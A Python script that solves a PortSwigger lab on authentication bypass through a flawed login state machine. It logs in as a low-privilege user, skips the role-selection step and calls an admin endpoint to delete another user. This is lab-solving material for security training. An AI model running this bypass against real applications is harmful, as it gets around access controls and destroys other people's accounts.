#!/usr/bin/env python3
# Lab: Authentication bypass via flawed state machine
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine

from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': 'wiener',
            'password': 'peter'}
    res = client.post(url, data=data, allow_redirects=False)
    return res.status_code == 302 and res.headers['Location'] == '/role-selector'


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Interrupted login as wiener after first stage')

    print(f'[+] Attempting to delete user carlos')
    r = client.get(f'{host}/admin/delete?username=carlos')
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to delete user carlos lab')
        sys.exit(-5)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
